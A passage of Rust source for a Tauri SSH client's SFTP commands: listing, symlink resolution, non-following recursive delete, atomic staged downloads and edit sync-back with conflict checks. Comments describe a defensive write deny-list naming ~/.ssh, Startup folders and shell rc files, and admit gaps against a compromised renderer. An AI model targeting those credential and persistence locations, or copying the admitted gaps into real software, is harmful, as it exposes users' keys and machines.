        None => CmdError(format!("download failed: {e}")),
    }
}

/// Open the SFTP subsystem on a live session (lazily, on first SFTP switch).
#[tauri::command]
pub async fn sftp_open(app: AppHandle, session_id: String) -> CmdResult<serde_json::Value> {
    require_unlocked(&app)?;
    // The registry insert below is the commit point of a secret-consuming
    // operation (it hands out an authenticated channel), and it sits after
    // two awaits - so the generation must be re-checked there, like
    // terminal_connect and key_export_to_file do. Without it, a lock that
    // lands while the subsystem request is in flight leaves a live channel
    // registered in the locked vault, usable again after the next unlock.
    let generation = crate::commands::capture_vault_generation(&app)?;
    let sftp_tx = app
        .state::<StdArc<SessionRegistry>>()
        .get_sftp_tx(&session_id)
        .ok_or_else(|| CmdError("No such session.".into()))?;
    let (tx, rx) = tokio::sync::oneshot::channel();
    sftp_tx
        .send(tx)
        .map_err(|_| CmdError("Session is closing.".into()))?;
    let sftp = rx
        .await
        .map_err(|_| CmdError("Session closed before SFTP opened.".into()))?
        .map_err(|e| CmdError(e.to_string()))?;

    let cwd = sftp
        .canonicalize(".")
        .await
        .unwrap_or_else(|_| "/".to_string());
    crate::commands::require_generation_current(&app, generation)?;
    app.state::<SftpRegistry>()
        .insert(session_id.clone(), Arc::new(sftp));
    Ok(serde_json::json!({ "ok": true, "cwd": cwd }))
}

/// A listed entry, remote or local (the local pane in dual-pane mode shares
/// this shape so the renderer can reuse one table renderer for both).
///
/// `is_link`, `permissions`, `uid` and `gid` all come for free off the same
/// listing response (SFTP's SSH_FXP_READDIR - like OpenSSH's local
/// `readdir(3)` - reports `lstat`-derived attributes for every entry, so a
/// symlink's own type bit and the owning ids are already in hand). None of
/// them costs an extra round trip; do not be tempted to "confirm" `is_link`
/// with a follow-up stat inside a listing loop - see [`sftp_resolve_link`]
/// for why that stays a separate, lazy, on-demand call instead.
///
/// `permissions` is the raw POSIX mode (type bits included, same encoding as
/// `st_mode`) - this file never formats `drwxr-xr-x` in Rust, the renderer
/// does. `user`/`group` symbolic names are deliberately absent: russh-sftp's
/// wire format for SFTPv3 attributes carries only numeric uid/gid (the
/// `FileAttributes.user`/`.group` fields exist on the struct but the crate's
/// READDIR/STAT deserializer always leaves them `None` - there is no wire
/// representation for them to come from), so exposing those fields here
/// would just be two more always-`null` keys in every entry.
#[derive(serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub struct SftpEntry {
    pub name: String,
    pub is_dir: bool,
    pub is_link: bool,
    pub size: u64,
    pub modified_ms: Option<i64>,
    pub permissions: Option<u32>,
    pub uid: Option<u32>,
    pub gid: Option<u32>,
}

#[tauri::command]
pub async fn sftp_list_dir(
    app: AppHandle,
    session_id: String,
    path: String,
) -> CmdResult<serde_json::Value> {
    let sftp = sftp_from_session(&app, &session_id)?;
    let mut entries: Vec<SftpEntry> = Vec::new();
    for entry in sftp
        .read_dir(&path)
        .await
        .map_err(|e| CmdError(format!("List failed: {e}")))?
    {
        let name = entry.file_name().to_string();
        if name == "." || name == ".." {
            continue;
        }
        let md = entry.metadata();
        entries.push(SftpEntry {
            name,
            // lstat-derived, per the struct doc: a symlink to a directory
            // reports is_dir == false here, is_link == true. The renderer
            // resolves what it actually points at lazily, on demand.
            is_dir: md.is_dir(),
            is_link: md.is_symlink(),
            size: md.size.unwrap_or(0),
            modified_ms: md.mtime.map(|s| (s as i64) * 1000),
            permissions: md.permissions,
            uid: md.uid,
            gid: md.gid,
        });
    }
    // Dirs first, then files, each alphabetical (case-insensitive).
    entries.sort_by(|a, b| {
        b.is_dir
            .cmp(&a.is_dir)
            .then_with(|| a.name.to_lowercase().cmp(&b.name.to_lowercase()))
    });
    Ok(serde_json::json!({ "ok": true, "entries": entries, "path": path }))
}

/// Resolve what a symlink reported by [`sftp_list_dir`] actually points at.
/// Deliberately a separate, on-demand call rather than folded into the
/// listing: a directory with hundreds of symlinks would otherwise cost
/// hundreds of extra round trips just to draw icons.
///
/// A dangling symlink is a normal, expected outcome of browsing a remote
/// filesystem (not a bug in this app, not a transport failure) so it is
/// reported as `{ok: true, broken: true}`, never as a command `Err` - the
/// renderer should render a "broken link" state, not an error toast.
#[tauri::command]
pub async fn sftp_resolve_link(
    app: AppHandle,
    session_id: String,
    path: String,
) -> CmdResult<serde_json::Value> {
    let sftp = sftp_from_session(&app, &session_id)?;
    // Best-effort display target: REALPATH resolution, not a local path
    // component - never fed to `Path::join` or similar, only shown to the
    // user. Attempted even for a link that turns out broken (many servers
    // can still resolve the textual target even when the final component
    // doesn't exist), but its absence never blocks the isDir/broken answer.
    let target = sftp.canonicalize(&path).await.ok();
    // `metadata` (SSH_FXP_STAT) follows the link, unlike the `symlink_metadata`
    // (SSH_FXP_LSTAT) used elsewhere in this file to classify the link itself.
    match sftp.metadata(&path).await {
        Ok(md) => Ok(serde_json::json!({
            "ok": true,
            "isDir": md.is_dir(),
            "target": target,
            "broken": false,
        })),
        Err(_) => Ok(serde_json::json!({
            "ok": true,
            "isDir": false,
            "target": target,
            "broken": true,
        })),
    }
}

#[tauri::command]
pub async fn sftp_mkdir(
    app: AppHandle,
    session_id: String,
    path: String,
) -> CmdResult<serde_json::Value> {
    let sftp = sftp_from_session(&app, &session_id)?;
    sftp.create_dir(&path)
        .await
        .map_err(|e| CmdError(format!("mkdir failed: {e}")))?;
    Ok(serde_json::json!({ "ok": true }))
}

#[tauri::command]
pub async fn sftp_remove(
    app: AppHandle,
    session_id: String,
    path: String,
    is_dir: bool,
) -> CmdResult<serde_json::Value> {
    let sftp = sftp_from_session(&app, &session_id)?;
    if is_dir {
        // Recursive delete: rmdir only succeeds on an EMPTY directory, so a
        // folder with contents must be emptied depth-first first.
        remove_remote_tree(&sftp, &path).await.map_err(CmdError)?;
    } else {
        sftp.remove_file(&path)
            .await
            .map_err(|e| CmdError(format!("rm failed: {e}")))?;
    }
    Ok(serde_json::json!({ "ok": true }))
}

/// Delete the remote folder `path` and everything in it (the recursive
/// `sftp_remove`). A link is unlinked, never walked: deleting a link to a
/// folder must not empty the folder it points to (READDIR follows a link).
/// LSTAT says what `path` is; on a server that leaves the type bits out it
/// is walked only when it resolves to itself (see [`resolves_to_itself`]).
fn remove_remote_tree<'a>(
    sftp: &'a russh_sftp::client::SftpSession,
    path: &'a str,
) -> Pin<Box<dyn Future<Output = Result<(), String>> + Send + 'a>> {
    Box::pin(async move {
        let md = sftp
            .symlink_metadata(path)
            .await
            .map_err(|e| format!("stat {path}: {}", sftp_error_detail(e)))?;
        let is_link = match classify_attrs(&md) {
            Some(kind) => kind == EntryKind::Symlink,
            None => !matches!(
                resolves_to_itself(sftp, path, &mut RealFolder::default()).await,
                Ok(true)
            ),
        };
        if is_link {
            return sftp
                .remove_file(path)
                .await
                .map_err(|e| format!("rm {path}: {e}"));
        }
        remove_tree_below(sftp, path).await
    })
}

/// Depth-first recursive delete of a remote directory tree. Children are
/// removed before their parent (rmdir requires an empty dir). Symlinks are
/// unlinked, never followed - `symlink_metadata` classifies the link itself.
/// An entry whose type the server leaves out is removed by
/// [`remove_untyped`]: REMOVE first, a folder only if it resolves to itself.
fn remove_tree_below<'a>(
    sftp: &'a russh_sftp::client::SftpSession,
    path: &'a str,
) -> Pin<Box<dyn Future<Output = Result<(), String>> + Send + 'a>> {
    Box::pin(async move {
        let mut first_err: Option<String> = None;
        let mut entries = sftp
            .read_dir(path)
            .await
            .map_err(|e| format!("list {path}: {e}"))?;
        while let Some(entry) = entries.next() {
            let name = entry.file_name().to_string();
            if name == "." || name == ".." {
                continue;
            }
            let child = format!("{}/{}", path.trim_end_matches('/'), name);
            let md = match sftp.symlink_metadata(&child).await {
                Ok(m) => m,
                Err(e) => {
                    // A child that vanishes mid-walk (or is unreadable) should
                    // not abort the whole delete - record and keep going.
                    if first_err.is_none() {
                        first_err = Some(format!("stat {child}: {e}"));
                    }
                    continue;
                }
            };
            let res = match classify_attrs(&md) {
                Some(EntryKind::Dir) => remove_tree_below(sftp, &child).await,
                // Links and everything else are unlinked; a link is never
                // followed.
                Some(_) => sftp
                    .remove_file(&child)
                    .await
                    .map_err(|e| format!("rm {child}: {e}")),
                None => remove_untyped(sftp, &child).await,
            };
            if let Err(e) = res {
                if first_err.is_none() {
                    first_err = Some(e);
                }
            }
        }
        // rmdir regardless, so a partially-emptied dir still goes away when it
        // became empty; surface the first child error only if the dir remains.
        if let Err(e) = sftp.remove_dir(path).await {
            return Err(match first_err {
                Some(fe) => format!("{fe} (rmdir {path}: {e})"),
                None => format!("rmdir {path}: {e}"),
            });
        }
        Ok(())
    })
}

/// Delete an entry whose type the server leaves out (its LSTAT said
/// nothing). REMOVE first: it never follows a link, so a file or a link is
/// simply gone - nothing to tell apart, and READLINK is not needed (it used
/// to be, so a server without it kept every file). Only when REMOVE fails is
/// the entry opened as a folder, and since that follows a link, it is
/// emptied only when it resolves to itself (see [`resolves_to_itself`]);
/// anything else is left, with REMOVE's error.
async fn remove_untyped(sftp: &russh_sftp::client::SftpSession, child: &str) -> Result<(), String> {
    let refused = match sftp.remove_file(child).await {
        Ok(()) => return Ok(()),
        Err(e) => format!("rm {child}: {e}"),
    };
    if probe_folder(sftp, child).await != EntryKind::Dir {
        return Err(refused);
    }
    match resolves_to_itself(sftp, child, &mut RealFolder::default()).await {
        Ok(true) => remove_tree_below(sftp, child).await,
        Ok(false) => Err(format!(
            "{refused} (it leads to a folder somewhere else, which was left alone)"
        )),
        Err(why) => Err(format!("{refused} ({why})")),
    }
}

#[tauri::command]
pub async fn sftp_rename(
    app: AppHandle,
    session_id: String,
    from: String,
    to: String,
) -> CmdResult<serde_json::Value> {
    let sftp = sftp_from_session(&app, &session_id)?;
    sftp.rename(&from, &to)
        .await
        .map_err(|e| CmdError(format!("rename failed: {e}")))?;
    Ok(serde_json::json!({ "ok": true }))
}

/// NOT REGISTERED in `generate_handler!`, deliberately: nothing in the renderer
/// calls it. The queue applies timestamps itself - the remote mtime on upload
/// legs, the local one on downloads - when `preserveTs` is passed to
/// `sftp_queue_add`. Kept, with its contract, for a future non-queue flow.
///
/// Set a remote file's mtime (and atime) via SFTP setstat - the remote half
/// of "preserve timestamps of transferred files". Servers that refuse SETSTAT
/// surface the error to the caller.
#[tauri::command]
pub async fn sftp_set_mtime(
    app: AppHandle,
    session_id: String,
    path: String,
    mtime_ms: i64,
) -> CmdResult<serde_json::Value> {
    let sftp = sftp_from_session(&app, &session_id)?;
    if mtime_ms < 0 {
        return Err(CmdError(
            "mtime must be a Unix timestamp in milliseconds.".into(),
        ));
    }
    let secs = (mtime_ms / 1000) as u32;
    let mut attrs = russh_sftp::protocol::FileAttributes::default();
    attrs.mtime = Some(secs);
    attrs.atime = Some(secs);
    sftp.set_metadata(&path, attrs)
        .await
        .map_err(|e| CmdError(format!("setstat failed: {e}")))?;
    Ok(serde_json::json!({ "ok": true, "mtime": secs }))
}

/// "Download as...": one remote file to a local path.
///
/// A6-02 (PARTIAL). The renderer picks `local` in the native save dialog
/// (`system_pick_save_path`), which registers the path in the
/// `DialogPathStore`; a path with that grant is consumed here - one grant, one
/// write - and trusted beyond the deny-list, because a human approved exactly
/// this location. Without a grant the path is only a renderer-supplied string
/// and gets the full [`LocalAccess::Write`] deny-list (`~/.ssh`, SSHSpan's
/// config directory, Startup folders, shell rc files) on top of the app-data
/// and system-directory rules.
///
/// The remaining boundary, honestly: a deny-list can never be complete. The
/// queue's `dest_dir`, queue uploads' sources and the local-pane
/// delete/rename/mkdir still take renderer-supplied paths that are checked
/// only against it, so a compromised renderer can still write, read or delete
/// anything the list does not name. What the list does name is enforced on
/// every local path a remote name leads to - each file and folder of a folder
/// download, an edit session's staged copy, a queued download again when it
/// starts (see [`derived_local_refusal`]) - and a delete or move of a folder
/// that HOLDS a listed location (the home folder, say) is refused. Closing
/// the rest needs dialog-approved directories (`system_pick_directory` + a
/// grant store with a TTL) and dialog-picked upload sources, which is a
/// larger change.
#[tauri::command]
pub async fn sftp_download(
    app: AppHandle,
    session_id: String,
    remote: String,
    local: String,
) -> CmdResult<serde_json::Value> {
    let sftp = sftp_from_session(&app, &session_id)?;
    let granted = app.state::<super::DialogPathStore>().consume(&local);
    check_download_target(&local, granted, &SensitiveLocations::current())?;
    download_to(&sftp, &remote, &local).await?;
    Ok(serde_json::json!({ "ok": true, "local": local }))
}

/// Download `remote` into local path `local`, robust against SFTP servers
/// that answer a read crossing EOF with SSH_FX_FAILURE instead of a short
/// read (seen in the wild on some sftp-server bridges/gateways; reproduced
/// against the dev-sshd fixture in EOF-FAILURE mode - the exact
/// "download failed: Failure: Failure" report).
///
/// Two defenses:
/// 1. Size-clamped reads: stat the file first and never request bytes past
///    EOF. `tokio::io::copy` always asks for a full 8 KiB buffer, so its
///    final read crosses EOF on any file whose size is not a multiple of
///    8 KiB - fatal against such servers.
/// 2. Tolerant close: if the server answers the CLOSE of a fully-copied
///    read handle with SSH_FX_FAILURE, the data has already landed locally,
///    so the transfer is treated as complete (logged, not failed).
///
/// The bytes are staged in `<local>.part` and renamed over `local` only once
/// the whole file is in (A7-34), like the queue does. This used to write
/// straight to `local` after unlinking whatever was there, so a failure part
/// way - a dropped connection after the user confirmed "replace" in the save
/// dialog - left a truncated file where the original had been. Any failure now
/// deletes the partial and leaves `local` exactly as it was. (The edit-staging
/// flow shares this function; its names are fresh, so it just gains the
/// atomic finish.) The staged copy is fsynced before that rename, so a crash
/// right after it cannot leave an empty or partial file under the final name.
///
/// Only a file is downloaded: a folder, or a pipe, socket or device (opening
/// a pipe for reading blocks the server until a writer appears), is refused
/// from its type before anything is opened - on a server that leaves the
/// type bits out, after asking (see [`picked_root_kind`]).
pub async fn download_to(
    sftp: &russh_sftp::client::SftpSession,
    remote: &str,
    local: &str,
) -> Result<(), CmdError> {
    download_to_hashed(sftp, remote, local).await.map(drop)
}

/// What [`download_to_hashed`] fetched.
struct Downloaded {
    /// SHA-256 of the bytes written - computed while writing them, so a change
    /// made to the local file right after the rename is not mistaken for them.
    sha256: String,
    /// The remote file as the STAT the download was based on saw it.
    stamp: RemoteStamp,
    /// Its permission bits (`st_mode & 0o7777`).
    mode: Option<u32>,
}

/// [`download_to`], also returning what was downloaded. A server that reports
/// no size is read to its end (it used to give an empty file).
async fn download_to_hashed(
    sftp: &russh_sftp::client::SftpSession,
    remote: &str,
    local: &str,
) -> Result<Downloaded, CmdError> {
    use sha2::{Digest, Sha256};
    use tokio::io::AsyncReadExt;

    let md = sftp
        .metadata(remote)
        .await
        .map_err(|e| describe_sftp_error("stat", e))?;
    match picked_root_kind(sftp, remote, &md).await {
        EntryKind::Dir => {
            return Err(CmdError(format!(
                "{remote} is a folder, not a file - download folders with Download, which copies everything in them."
            )))
        }
        EntryKind::Other => {
            return Err(CmdError(format!(
                "{remote} is not a regular file (a pipe, socket or device), so it cannot be downloaded."
            )))
        }
        // Never opened on a guess: it could be a folder, or a pipe whose
        // read blocks the server.
        EntryKind::Unknown => {
            return Err(CmdError(format!(
                "Could not tell whether {remote} is a file or a folder (the server does not say), so it was not downloaded."
            )))
        }
        EntryKind::File | EntryKind::Symlink => {}
    }
    // Unknown size: read to the end (`u64::MAX` = no clamp, no completeness
    // check), like the queue does.
    let size = md.size.unwrap_or(u64::MAX);
    let mut hasher = Sha256::new();

    let mut remote_file = sftp
        .open(remote)
        .await
        .map_err(|e| describe_sftp_error("open", e))?;
    let part = crate::sftp::queue::part_path(local);
    // Removes the partial on every early exit; disarmed after the rename.
    let mut part_guard = PartFileGuard(Some(PathBuf::from(&part)));
    // Replace-without-following, not File::create: see create_transfer_file.
    let mut local_file = crate::sftp::create_transfer_file(std::path::Path::new(&part))
        .await
        .map_err(|e| CmdError(format!("local create failed: {e}")))?;

    // 256 KiB chunks (matches russh-sftp's max_packet_len), each clamped to the
    // remaining bytes. A short read (< requested) means EOF on well-behaved
    // servers; the size clamp means we never ask past EOF on any server.
    let mut buf = vec![0u8; 256 * 1024];
    let mut done: u64 = 0;
    while done < size {
        let want = ((size - done) as usize).min(buf.len());
        let n = remote_file
            .read(&mut buf[..want])
            .await
            .map_err(|e| describe_download_read_error(e))?;
        if n == 0 {
            break;
        }
        local_file
            .write_all(&buf[..n])
            .await
            .map_err(|e| CmdError(format!("local write failed: {e}")))?;
        hasher.update(&buf[..n]);
        done += n as u64;
    }
    local_file
        .flush()
        .await
        .map_err(|e| CmdError(format!("local flush failed: {e}")))?;
    local_file
        .sync_all()
        .await
        .map_err(|e| CmdError(format!("local fsync failed: {e}")))?;
    #[cfg(test)]
    tests::note_download_step(local, "fsync");
    drop(local_file);

    if size != u64::MAX && done < size {
        return Err(CmdError(format!(
            "download incomplete: got {done} of {size} bytes from {remote}"
        )));
    }

    // Await the SFTP CLOSE response so a completed transfer is not reported
    // while the remote handle is still being flushed/closed. Some servers
    // reply FAILURE to CLOSE of a read handle even after a clean copy; the
    // bytes are already local, so that is a warning, not a failure.
    if let Err(e) = remote_file.close().await {
        log::warn!("[sshspan-sftp] close after download of {remote}: {e}");
    }
    // The whole file is in: only now does it replace the destination (an
    // atomic rename over an existing file on every platform std supports).
    #[cfg(test)]
    tests::note_download_step(local, "rename");
    tokio::fs::rename(&part, local)
        .await
        .map_err(|e| CmdError(format!("local rename failed: {e}")))?;
    part_guard.0 = None;
    Ok(Downloaded {
        sha256: format!("{:x}", hasher.finalize()),
        stamp: RemoteStamp::of(&md),
        mode: md.permissions.map(|m| m & 0o7777),
    })
}

/// Deletes a staged `.part` file when dropped unless disarmed (set to `None`):
/// every error path out of [`download_to`] leaves nothing behind.
struct PartFileGuard(Option<PathBuf>);

impl Drop for PartFileGuard {
    fn drop(&mut self) {
        if let Some(path) = self.0.take() {
            let _ = std::fs::remove_file(path);
        }
    }
}

/// NOT REGISTERED in `generate_handler!`, deliberately: nothing calls it. Every
/// upload goes through `sftp_queue_add`, which creates the remote directories,
/// stages into `.part`, resumes, verifies and preserves timestamps; this
/// older single-shot path does none of that and reads a renderer-chosen local
/// path, so as a registered command it was only surface for a compromised
/// renderer. Re-register it only together with a caller.
#[tauri::command]
pub async fn sftp_upload(
    app: AppHandle,
    session_id: String,
    local: String,
    remote: String,
) -> CmdResult<serde_json::Value> {
    let sftp = sftp_from_session(&app, &session_id)?;
    validate_sftp_local_path(&local, LocalAccess::Read)?;
    let local_path = PathBuf::from(&local);
    let metadata = tokio::fs::metadata(&local_path)
        .await
        .map_err(|e| CmdError(format!("local path failed: {e}")))?;
    let files = if metadata.is_dir() {
        upload_directory(sftp.clone(), local_path, remote.clone()).await?
    } else {
        upload_one_file(sftp.clone(), local_path, remote.clone()).await?;
        1
    };
    Ok(serde_json::json!({ "ok": true, "remote": remote, "files": files }))
}

async fn upload_one_file(
    sftp: Arc<russh_sftp::client::SftpSession>,
    local: PathBuf,
    remote: String,
) -> Result<(), CmdError> {
    let mut local_file = tokio::fs::File::open(&local)
        .await
        .map_err(|e| CmdError(format!("local file failed: {e}")))?;
    let mut remote_file = sftp
        .create(&remote)
        .await
        .map_err(|e| CmdError(format!("remote open failed: {e}")))?;
    tokio::io::copy(&mut local_file, &mut remote_file)
        .await
        .map_err(|e| CmdError(format!("upload failed: {e}")))?;
    remote_file
        .close()
        .await
        .map_err(|e| CmdError(format!("upload close failed: {e}")))?;
    Ok(())
}

fn upload_directory(
    sftp: Arc<russh_sftp::client::SftpSession>,
    local_dir: PathBuf,
    remote_dir: String,
) -> Pin<Box<dyn Future<Output = Result<usize, CmdError>> + Send>> {
    Box::pin(async move {
        sftp.create_dir(&remote_dir)
            .await
            .map_err(|e| CmdError(format!("remote mkdir failed: {e}")))?;
        let mut count = 0;
        let mut entries = tokio::fs::read_dir(&local_dir)
            .await
            .map_err(|e| CmdError(format!("local directory failed: {e}")))?;
        while let Some(entry) = entries
            .next_entry()
            .await
            .map_err(|e| CmdError(format!("local directory read failed: {e}")))?
        {
            let local = entry.path();
            let remote = format!(
                "{}/{}",
                remote_dir.trim_end_matches('/'),
                entry.file_name().to_string_lossy()
            );
            if entry
                .file_type()
                .await
                .map_err(|e| CmdError(format!("local file type failed: {e}")))?
                .is_dir()
            {
                count += upload_directory(sftp.clone(), local, remote).await?;
            } else {
                // F5: descendants of a validated root re-pass the source
                // authorization check, so a broad folder upload cannot lift
                // the vault DB (or a symlink to it) out of app data.
                if is_protected_upload_source(&local) {
                    log::warn!(
                        "[sshspan-sftp] upload: skipping protected source {}",
                        local.display()
                    );
                    continue;
                }
                upload_one_file(sftp.clone(), local, remote).await?;
                count += 1;
            }
        }
        Ok(count)
    })
}

// ─── "edit in system editor": download, watch, sync back (A7-19) ───────────

/// Suffix of the temporary remote file an edit is uploaded to before it
/// replaces the original.
const EDIT_TMP_SUFFIX: &str = ".sshspan-tmp";

/// Quiet period after the LAST change of a save before the edit is uploaded.
const EDIT_DEBOUNCE: std::time::Duration = std::time::Duration::from_millis(700);

/// Coalesces a burst of change events into ONE upload with a generation
/// counter. One save routinely fires several events (data, metadata,
/// create/rename for atomic-save editors, plus attribute noise from
/// indexers); the old code spawned a task per event that slept and uploaded,
/// so a single save started two or three overlapping uploads of the same file
/// to the same remote path.
struct EditDebounce {
    generation: std::sync::atomic::AtomicU64,
    window: std::time::Duration,
}

impl EditDebounce {
    fn new(window: std::time::Duration) -> Self {
        Self {
            generation: std::sync::atomic::AtomicU64::new(0),
            window,
        }
    }

    /// Record a change and wait out the window. `Some(generation)` only when
    /// no newer change arrived meanwhile - i.e. for the LAST change of a
    /// burst, which is the only one that uploads.
    async fn settle(&self) -> Option<u64> {
        let mine = self.generation.fetch_add(1, Ordering::SeqCst) + 1;
        tokio::time::sleep(self.window).await;
        self.is_current(mine).then_some(mine)
    }

    fn is_current(&self, generation: u64) -> bool {
        self.generation.load(Ordering::SeqCst) == generation
    }
}

/// Does this file-watcher event mean "the staged file was saved"? The watch is
/// on the staging DIRECTORY, not the file: editors that save atomically (write
/// a temp file, then rename it over the original) replace the inode, which
/// ends a watch on the file itself, so such a save was never uploaded. Directory
/// events for the staged name are accepted when the file is created, written,
/// or renamed INTO place; renaming it away, deleting it, and pure
/// metadata/access noise are not saves.
fn is_edit_trigger(event: &notify::Event, staged_name: &std::ffi::OsStr) -> bool {
    use notify::event::{EventKind, ModifyKind, RenameMode};
    let named = |p: &std::path::Path| p.file_name().is_some_and(|n| n == staged_name);
    match &event.kind {
        EventKind::Create(_)
        | EventKind::Modify(ModifyKind::Data(_))
        | EventKind::Modify(ModifyKind::Any)
        | EventKind::Modify(ModifyKind::Name(RenameMode::To))
        | EventKind::Modify(ModifyKind::Name(RenameMode::Any))
        | EventKind::Modify(ModifyKind::Name(RenameMode::Other)) => {
            event.paths.iter().any(|p| named(p))
        }
        // `[from, to]`: only the DESTINATION being our file is a save.
        EventKind::Modify(ModifyKind::Name(RenameMode::Both)) => {
            event.paths.last().is_some_and(|p| named(p))
        }
        _ => false,
    }
}

/// What one file-watcher callback means for an edit.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum WatchVerdict {
    /// The staged file was saved.
    Save,
    /// The watcher lost events and cannot say what happened: the staged file
    /// has to be compared with what the server holds.
    Rescan,
    /// Something else in the staging folder.
    Unrelated,
}

/// What one file-watcher callback means for an edit; `Err` is the watcher
/// itself reporting a problem (a vanished directory...). The error is
/// surfaced - the caller logs it - rather than discarded: a watcher that has
/// died looks exactly like "the user never saved", and the edit would
/// silently stop syncing.
fn watch_verdict(
    result: Result<notify::Event, notify::Error>,
    staged_name: &std::ffi::OsStr,
) -> Result<WatchVerdict, String> {
    match result {
        // notify 7 reports a lost-events overflow as an event carrying the
        // Rescan flag (inotify's IN_Q_OVERFLOW, FSEvents' rescan), whatever
        // path it names - the save may be among what was lost.
        Ok(event) if event.need_rescan() => Ok(WatchVerdict::Rescan),
        Ok(event) if is_edit_trigger(&event, staged_name) => Ok(WatchVerdict::Save),
        Ok(_) => Ok(WatchVerdict::Unrelated),
        Err(e) => Err(e.to_string()),
    }
}

/// What a remote file was when an edit session last agreed with it (the
/// download, a sync-back, an Overwrite or a Reload): a different size or
/// modification time at the next sync-back means someone else changed it.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
struct RemoteStamp {
    size: Option<u64>,
    mtime: Option<u32>,
}

impl RemoteStamp {
    fn of(md: &russh_sftp::protocol::FileAttributes) -> Self {
        Self {
            size: md.size,
            mtime: md.mtime,
        }
    }
}

/// Why a save was held back for the user to decide.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ConflictReason {
    /// The remote file's size or time differs from what the session last
    /// agreed with.
    Changed,
    /// The remote file is gone.
    Deleted,
    /// The server reports neither size nor time, and the file is too large to
    /// compare by content.
    Unverifiable,
}

impl ConflictReason {
    fn as_str(self) -> &'static str {
        match self {
            Self::Changed => "changed",
            Self::Deleted => "deleted",
            Self::Unverifiable => "unverifiable",
        }
    }
}

/// A conflict reported to the user (`sftp-edit-sync` with `conflict: true`)
/// and not resolved yet. `sftp_edit_resolve` must name it by `id`, and an
/// Overwrite goes ahead only while the remote file is still as reported.
#[derive(Debug, Clone, PartialEq, Eq)]
struct PendingConflict {
    id: String,
    reason: ConflictReason,
    /// The remote file as reported (no size or time when it was deleted).
    remote: RemoteStamp,
    /// SHA-256 of the remote content as reported, when the conflict was
    /// found by content (a server that reports neither size nor time).
    remote_sha256: Option<String>,
    /// SHA-256 of the local copy when it was last reported (not sent).
    local: String,
}

/// How the remote file differed from what the session last agreed with.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Differs {
    reason: ConflictReason,
    remote: RemoteStamp,
    /// SHA-256 of its content, when it was compared by content.
    remote_sha256: Option<String>,
}

/// A sync-back that did not go through.
#[derive(Debug, Clone, PartialEq, Eq)]
struct FailedSync {
    /// SHA-256 of the content it was for; `None` when the staged copy could
    /// not be read at all.
    local: Option<String>,
    error: String,
}

/// What an edit remembers about sync-backs that did not go through (see
/// [`EditSync::on_change`]).
#[derive(Default)]
struct SyncRetry {
    /// The watcher saw a save since the last attempt: it gets an attempt
    /// even for content that already failed.
    save_seen: std::sync::atomic::AtomicBool,
    /// The last failure, reported once.
    failure: std::sync::Mutex<Option<FailedSync>>,
    /// The temporary file a failed swap left on the server (with the complete
    /// new content). It is removed before the next attempt makes another, so
    /// an edit never leaves more than one.
    kept_temp: std::sync::Mutex<Option<String>>,
}

/// The remote file of an edit as one STAT found it.
enum RemoteNow {
    Present(RemoteStamp),
    Deleted,
    /// The check itself failed; why.
    Failed(String),
}

/// What a sync-back's check of the remote file found.
enum Check {
    /// As the session last agreed with it: the save may go in.
    Agrees,
    /// Changed, deleted or not comparable: held back for the user.
    Differs(Differs),
    /// The check failed; nothing is uploaded.
    Failed(String),
}

/// Content of a remote file compared by hash when its server reports neither
/// size nor time - at most this many bytes.
const EDIT_COMPARE_MAX_BYTES: u64 = 16 * 1024 * 1024;

/// What one sync-back or resolution came to - reported in an `sftp-edit-sync`
/// event so a save is never silently lost or silently forced over someone
/// else's change.
#[derive(Debug, Clone, PartialEq, Eq)]
enum SyncOutcome {
    /// The saved file is on the server.
    Uploaded,
    /// It is not; why.
    Failed(String),
    /// Not uploaded: held back for the user to decide.
    Conflict {
        name: String,
        conflict: PendingConflict,
    },
    /// The local copy was replaced by the server's version.
    Reloaded,
}

/// The payload of the `sftp-edit-sync` event.
fn edit_sync_event(
    session_id: &str,
    edit_id: &str,
    remote: &str,
    outcome: &SyncOutcome,
) -> serde_json::Value {
    let mut event = serde_json::json!({
        "sessionId": session_id, "editId": edit_id, "remote": remote,
    });
    let fields = match outcome {
        SyncOutcome::Uploaded => serde_json::json!({ "ok": true }),
        SyncOutcome::Failed(error) => serde_json::json!({ "ok": false, "error": error }),
        SyncOutcome::Conflict { name, conflict } => serde_json::json!({
            "ok": false,
            "conflict": true,
            "conflictId": conflict.id,
            "reason": conflict.reason.as_str(),
            "error": match conflict.reason {
                ConflictReason::Changed => format!(
                    "{name} changed on the server since you opened it - choose Overwrite or Reload."
                ),
                ConflictReason::Deleted => format!(
                    "{name} was deleted on the server since you opened it - choose Overwrite to put your copy back, or close it."
                ),
                ConflictReason::Unverifiable => format!(
                    "SSHSpan cannot tell whether {name} changed on the server (the server reports neither its size nor its time, and the file is too large to compare) - choose Overwrite or Reload."
                ),
            },
            "remoteSize": conflict.remote.size,
            "remoteModifiedMs": conflict.remote.mtime.map(|s| i64::from(s) * 1000),
        }),
        SyncOutcome::Reloaded => serde_json::json!({ "ok": true, "reloaded": true }),
    };
    if let (Some(event), Some(fields)) = (event.as_object_mut(), fields.as_object()) {
        event.extend(fields.clone());
    }
    event
}

/// What the user chose for an edit whose remote file changed meanwhile.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum EditResolution {
    /// Upload the local copy over the server's version.
    Overwrite,
    /// Replace the local copy with the server's version.
    Reload,
}

impl EditResolution {
    fn parse(action: &str) -> Result<Self, String> {
        match action {
            "overwrite" => Ok(Self::Overwrite),
            "reload" => Ok(Self::Reload),
            other => Err(format!(
                "Unknown action {other:?} - expected \"overwrite\" or \"reload\"."
            )),
        }
    }
}

/// The message when the renderer refers to an edit session that has ended.
const EDIT_SESSION_ENDED: &str =
    "This edit session has ended (closed, or the vault was locked) - open the file again.";

/// SHA-256 (hex) of a local file, read off the async runtime.
async fn sha256_file(path: &std::path::Path) -> std::io::Result<String> {
    let path = path.to_path_buf();
    tokio::task::spawn_blocking(move || {
        use sha2::{Digest, Sha256};
        let mut file = std::fs::File::open(&path)?;
        let mut hasher = Sha256::new();
        std::io::copy(&mut file, &mut hasher)?;
        Ok(format!("{:x}", hasher.finalize()))
    })
    .await
    .map_err(std::io::Error::other)?
}

/// What one upload of an edited file wrote.
#[derive(Debug, Clone, Copy)]
struct EditUpload {
    bytes: u64,
    /// The new file as LSTAT saw it just before it was renamed into place -
    /// the baseline later saves are compared with (taken before the rename,
